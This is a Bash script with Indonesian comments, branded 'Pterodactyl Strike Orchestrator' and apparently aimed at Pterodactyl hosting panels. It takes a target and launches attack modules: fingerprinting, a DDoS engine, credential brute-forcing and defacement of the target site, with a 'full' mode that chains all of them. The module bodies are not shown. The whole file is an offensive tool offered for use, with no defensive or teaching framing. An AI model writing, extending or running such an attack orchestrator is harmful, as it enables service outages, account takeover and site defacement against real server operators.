#!/bin/bash

# PTERODACTYL STRIKE ORCHESTRATOR
# Versi: 2.0
# Author: Chardox Arsenal System

set -euo pipefail

# Warna untuk output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Direktori base
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$SCRIPT_DIR/config"
MODULES_DIR="$SCRIPT_DIR/modules"
TOOLS_DIR="$SCRIPT_DIR/tools"
LOGS_DIR="$SCRIPT_DIR/logs"
OUTPUTS_DIR="$SCRIPT_DIR/outputs"

# Source utilitas
source "$MODULES_DIR/utils.sh"

# Inisialisasi logging
init_logging

# Banner
echo -e "${RED}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════╗
║   ██████╗ ████████╗███████╗██████╗  ██████╗ ██████╗      ║
║   ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗██╔══██╗     ║
║   ██████╔╝   ██║   █████╗  ██████╔╝██║   ██║██║  ██║     ║
║   ██╔═══╝    ██║   ██╔══╝  ██╔══██╗██║   ██║██║  ██║     ║
║   ██║        ██║   ███████╗██║  ██║╚██████╔╝██████╔╝     ║
║   ╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝      ║
║                                                           ║
║              STRIKE v2.0 - PTERODACTYL KILLER             ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Fungsi untuk menampilkan help
show_help() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -t, --target TARGET     Target IP atau domain"
    echo "  -m, --mode MODE         Mode serangan: full, ddos, brute, deface"
    echo "  -d, --duration SEC      Durasi serangan dalam detik (default: 60)"
    echo "  -p, --port PORT         Port target (default: 80)"
    echo "  --ssl                   Gunakan HTTPS"
    echo "  --threads NUM           Jumlah thread/concurrency (default: 200)"
    echo "  --deface-file FILE      File HTML untuk deface (default: deface.html)"
    echo "  -h, --help              Tampilkan help ini"
    echo ""
    echo "Examples:"
    echo "  $0 -t 192.168.1.100 -m full -d 120 --ssl"
    echo "  $0 -t panel.example.com -m deface --deface-file custom.html"
    echo "  $0 -t 10.0.0.1 -m brute -d 300"
}

# Parse arguments
TARGET=""
MODE="full"
DURATION=60
PORT=80
SSL=false
THREADS=200
DEFACE_FILE="$CONFIG_DIR/payloads/deface.html"

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET="$2"
            shift 2
            ;;
        -m|--mode)
            MODE="$2"
            shift 2
            ;;
        -d|--duration)
            DURATION="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        --ssl)
            SSL=true
            shift
            ;;
        --threads)
            THREADS="$2"
            shift 2
            ;;
        --deface-file)
            DEFACE_FILE="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Validasi target
if [[ -z "$TARGET" ]]; then
    echo -e "${RED}[ERROR] Target tidak ditentukan${NC}"
    show_help
    exit 1
fi

# Konfigurasi target
PROTOCOL="http"
if [[ "$SSL" == true ]]; then
    PROTOCOL="https"
fi

TARGET_URL="$PROTOCOL://$TARGET"
TARGET_IP=$(dig +short "$TARGET" | head -1)
if [[ -z "$TARGET_IP" ]]; then
    TARGET_IP="$TARGET"
fi

log_info "Target: $TARGET ($TARGET_IP)"
log_info "Mode: $MODE"
log_info "Duration: ${DURATION}s"
log_info "Threads: $THREADS"

# Export variabel untuk modul
export TARGET TARGET_IP TARGET_URL PORT SSL DURATION THREADS
export CONFIG_DIR MODULES_DIR TOOLS_DIR LOGS_DIR OUTPUTS_DIR

# Eksekusi berdasarkan mode
case $MODE in
    full)
        log_info "Memulai serangan full spectrum..."
        source "$MODULES_DIR/fingerprint.sh"
        fingerprint_target
        source "$MODULES_DIR/ddos_engine.sh"
        start_ddos "$DURATION" "$THREADS" &
        DDOS_PID=$!
        sleep 5
        source "$MODULES_DIR/credential_engine.sh"
        start_bruteforce "$DURATION" &
        BRUTE_PID=$!
        wait $DDOS_PID $BRUTE_PID
        source "$MODULES_DIR/deface_injector.sh"
        inject_deface "$DEFACE_FILE"
        ;;
    ddos)
        log_info "Memulai serangan DDoS..."
        source "$MODULES_DIR/fingerprint.sh"
        fingerprint_target
        source "$MODULES_DIR/ddos_engine.sh"
        start_ddos "$DURATION" "$THREADS"
        ;;
    brute)
        log_info "Memulai brute force credentials..."
        source "$MODULES_DIR/credential_engine.sh"
        start_bruteforce "$DURATION"
        ;;
    deface)
        log_info "Memulai injeksi deface..."
        source "$MODULES_DIR/deface_injector.sh"
        inject_deface "$DEFACE_FILE"
        ;;
    *)
        echo -e "${RED}[ERROR] Mode tidak dikenal: $MODE${NC}"
        exit 1
        ;;
esac

log_info "Serangan selesai"
echo -e "${GREEN}[+] Hasil disimpan di: $OUTPUTS_DIR/${NC}"
